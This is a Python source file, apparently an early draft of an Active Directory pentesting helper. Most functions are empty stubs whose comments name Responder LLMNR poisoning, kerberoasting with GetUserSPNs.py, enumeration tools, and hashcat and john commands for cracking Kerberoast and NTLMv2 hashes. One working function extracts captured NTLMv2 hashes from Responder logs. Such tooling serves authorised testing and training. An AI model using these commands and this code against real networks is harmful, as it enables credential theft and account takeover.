import re, os, subprocess

def is_active_directory():
    pass

def llmnr_poisoning():
    # sudo responder -I [interface]
    pass

def kerberoasting():
    # GetUserSPNs.py
    pass

# MAYBE
def asrep_roasting():
    pass


def process_ntlm_hashes():
    log_file_path = "/usr/share/responder/logs/Responder-Session.log"
    output_file_path = "/mnt/data/ntlmv2-hashes.txt"

    bash_command = f"""
    # Check if the log file exists, if not, exit the script or handle accordingly
    if [ ! -f "{log_file_path}" ]; then
        echo "Log file does not exist, exiting..."
        exit 1
    fi

    while IFS= read -r line; do
        # Use awk to extract the full hash, which includes the username
        full_hash=$(echo "$line" | awk -F': ' '{{print $2}}')

        # Check if the full hash already exists in the output file
        if ! grep -qF -- "$full_hash" "{output_file_path}"; then
            # If the hash entry is not found, append it to the file
            echo "$full_hash" >> "{output_file_path}"
            echo "[*] Added: $full_hash"
        fi
    done < <(grep "NTLMv2-SSP Hash" "{log_file_path}")
    """

    # Run the bash command using Python's subprocess module
    process = subprocess.Popen(bash_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, executable='/bin/bash')
    stdout, stderr = process.communicate()

    # Print the output and any errors
    print(stdout.decode())
    if stderr:
        print("Errors:")
        print(stderr.decode())

def list_hashes():
    process_ntlm_hashes()

    hashes_file_path = '/mnt/data/ntlmv2-hashes.txt'
    # Check if the file exists before trying to open it
    if os.path.exists(hashes_file_path):
        with open(hashes_file_path, 'r') as file:
            for line in file:
                print(line.strip())
    else:
        print("Hashes file does not exist.")

def basic_ad_enum():
    # nbtscan, enum4linux
    pass

def crack_kerberoast_hash():
    # hashcat -m 13100 -a 0 crackthis /usr/share/wordlists/rockyou.txt --outfile="cracked.txt" --force
    # john crackthis -w=/usr/share/wordlists/rockyou.txt
    pass

def crack_ntlmv2():
    # hashcat -m 5600 forend_ntlmv2 /usr/share/wordlists/rockyou.txt
    pass

def crack_ntlm():
    pass
